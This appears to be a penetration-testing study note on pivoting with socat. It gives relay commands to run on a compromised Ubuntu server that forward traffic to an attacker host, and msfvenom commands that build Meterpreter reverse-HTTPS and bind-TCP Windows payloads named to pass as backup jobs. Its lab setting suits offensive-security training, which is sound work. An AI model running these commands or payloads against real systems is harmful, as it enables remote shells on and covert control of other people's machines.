# Socat Redirection with a Reverse Shell

`Socat` is a bidirectional relay that create pipe sockets between two independent network channels without needing SSH tunnelling. It acts as a redirector.
#### Starting Socat Listener

Start this on the compromised Ubuntu server

```sh
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

It will listen on localhost port `8080` and forwards all traffic to port `80` on our attacker host.
#### Creating the Windows Payload

```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```

---
# Socat Redirection with a Bind Shell

In the case of bind shells, the Windows server will start a listener and bind to a particular port.

![[Socat Bind Shell.png]]

#### Create the Windows Payload

```sh
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

We can start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.
#### Starting Socat Bind Shell Listener

```sh
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

Next, we can create a Metasploit handler that will connect to our `socat` listener on port 8080 (Ubuntu server)
